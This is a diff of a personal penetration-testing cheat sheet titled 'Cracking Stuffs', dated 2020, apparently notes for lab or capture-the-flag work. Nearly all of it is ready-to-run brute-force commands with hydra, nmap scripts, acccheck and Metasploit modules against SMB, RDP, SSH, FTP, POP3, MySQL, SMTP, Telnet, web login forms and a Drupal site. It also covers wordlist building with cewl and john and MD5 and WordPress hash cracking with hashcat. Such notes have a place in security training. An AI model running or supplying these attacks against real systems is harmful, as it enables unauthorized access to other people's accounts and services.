@@ -1,37 +1,85 @@
+    # Cracking Stuffs
 
-  ## SMB bruteforece
+    > Name |  Tuesday, 29 September 2020
+
+-------------------------------------------------------------------------------
+
+############# Convert hashes to uppercase for LM hashes ##############
+
+tr a-z A-Z < ./ralph2.txt
+ --------------------------------------------------------------------
+
+  ############ SMB bruteforece ############
+
 nmap --script=smb-brute.nse 192.x.x.x
 nmap -sV -p 445 --script smb-brute 192.168.13.200-254
 acccheck -v -t 10.1.1.22 -u kevin -P /usr/share/wordlists/rockyou.txt
 
-## HTTP bruteforce (forms)
-hydra -l admin -P /root/ctf_wordlist.txt domain.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V
+-sV: All Open Ports to determine Service/VERSION INFO
+-p: <port ranges>: Only Scan for Specified Ports
+--script-args-file=filename: provide NSE script args in a file
+-v: For verbose mode
+-u: For single user
+-P: For wordlist
+-t: Host IP addr
+ ---------------------------------------------------------------------
 
-  ## RDP bruteforce
+  ############ HTTP bruteforce (forms) #############
+
+hydra -l admin -P /root/ctf_wordlist.txt domain.com http-post-form 
+"/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V
+
+-l: LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+-P: -P FILE  try password PASS, or load several passwords from FILE {Wordlist}
+-V: For verbose output
+--------------------------------------------------------------------------------------------
+
+  ########### RDP bruteforce ##############
+
 hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://192.168.x.x
 
-  ## SSH bruteforce
+-t: TASKS  run TASKS number of connects in parallel (per host, default: 16)
+
+---------------------------------------------------------------------
+
+  ############ SSH bruteforce #############
+
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.13.234 ssh
 hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ssh
 hydra -t 4 -L /usr/share/wordlists/cristi.txt -p some_passsword 192.168.13.236 ssh
 hydra -t 4 -l root -P /usr/share/wordlists/cristi-passwords.txt 127.0.0.1 -s 50000 ssh
 
-  ## Bruteforce FTP
+----------------------------------------------------------------------
+
+  ########### Bruteforce FTP ##############
+
 hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ftp
 use auxiliary/scanner/ftp/ftp_login
 
-  ##Bruteforce POP3
+-----------------------------------------------------------------------
+
+  ############ Bruteforce POP3 ##############
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.158 pop3
 
-  ## DNS bruteforce
+----------------------------------------------------------------------
+
+  ############# DNS bruteforce #############
+
 nmap -p 80 --script dns-brute.nse domain.com 
 python dnscan.py -d domain.com -w ./subdomains-10000.txt
+ 
+-----------------------------------------------------------------
 
-  ## MySQL bruteforce
-nmap -p 3306 --script mysql-brute --script-args userdb=/usr/share/wordlists/mysql_users.txt,passdb=/usr/share/wordists/rockyou.txt -vv 192.168.31.139
+  ############ MySQL bruteforce ##############
+
+nmap -p 3306 --script mysql-brute --script-args 
+userdb=/usr/share/wordlists/mysql_users.txt,passdb=/usr/share/wordists/rockyou.txt -vv 192.168.31.139
    OR with hexorbase
 
- ## SMTP brute force
+-----------------------------------------------------------------------
+
+ ############# SMTP brute force ###############
+
 hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w 20 -f 192.168.29.55 smtp
 
 -l LOGIN name
@@ -43,7 +91,9 @@ hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w
 -w waittime for responses (32s) / between connects per thread
 -f exit after the first found login/password pair
 
-  ## Telnet bruteforce
+---------------------------------------------------------------------------------
+
+  ################# Telnet bruteforce ###################
 
 use auxiliary/scanner/telnet/telnet_login
 msf auxiliary(telnet_login) > set BLANK_PASSWORDS false
@@ -62,24 +112,53 @@ msf auxiliary(telnet_login) > run
 
 msf auxiliary(telnet_login) > sessions -l  // to see the sessions that succeded
 
-    ## MySql, Oracle, PostgreSQL, SQLlite, MS-Sql bruteforcer and database browser
-hexorbase
+---------------------------------------------------------------------------------------
 
-  ## Generate a wordlist from a webpage
-cewl www.megacorpone.com -m 6 -w /root/newfilelist.txt 2>/dev/null
+    ############### MySql, Oracle, PostgreSQL, SQLlite, ############
+    ######## MS-Sql bruteforcer and database browserhexorbase ##########
+  
+--------------------------------------------------------------
 
-  ## Mangle/permutate a wordlist with john
+  ########### Generate a wordlist from a webpage #############
+
+cewl www.examlpe.com -m 6 -w /root/newfilelist.txt 2>/dev/null
+
+-m: --min_word_length: Minimum word length, default 3.
+-w: For wordlist
+> More arguments
+--with-numbers: Accept words with numbers in as well as just letters
+-n, --no-words: Don't output the wordlist.
+-a, --meta: include meta data.
+-c, --count: Show the count for each word found.
+-v, --verbose: Verbose.
+-d <x>,--depth <x>: Depth to spider to, default 2.
+-------------------------------------------------------------------
+
+  ######### Mangle/permutate a wordlist with john #############
+
 john --wordlist=cewlgeneratedwordlist.txt --rules --stdout > megamangled.txt
 
-  ## Drupal bruteforce attack
-  #crack the password of admin
+------------------------------------------------------------------
+
+  ######### Drupal bruteforce attack ########
+   #######crack the password of admin ######
+
 site="192.168.230.147"
 id=$(curl -s http://$site/user/|grep "form_build_id" |cut -d"\"" -f6)
 hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt $site http-form-post "/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry" -V
+---------------------------------------------------------------------------------------------------
+######### crack MD5 with hashcat and wordlist. a=0 is straight attack ############
 
-#crack MD5 with hashcat and wordlist. a=0 is straight attack
 oclHashcat64.exe -m 0 -a 0 C:\Users\Cristi\Downloads\hashuri.txt F:\wordlist\realuniq.lst
 oclHashcat64.exe -m 0 -pw-max=8 C:\Users\Cristi\Downloads\hashuri.txt F:\wordlist\realuniq.lst
 
-#Brute force Wordpress (PHPASS)
+------------------------------------------------------------------------------
+
+################# Brute force Wordpress (PHPASS) ######################
+
 cudahashcat64.exe -m 400 -a 3 hashfile wordlist
+
+-----------------------------------------------------------------
+
+&&&&&&&&&&&&&&&&&& Thanks For Reading $$$$$$$$$$$$$$$$$$$$$$$
+__________________________________________________________________________
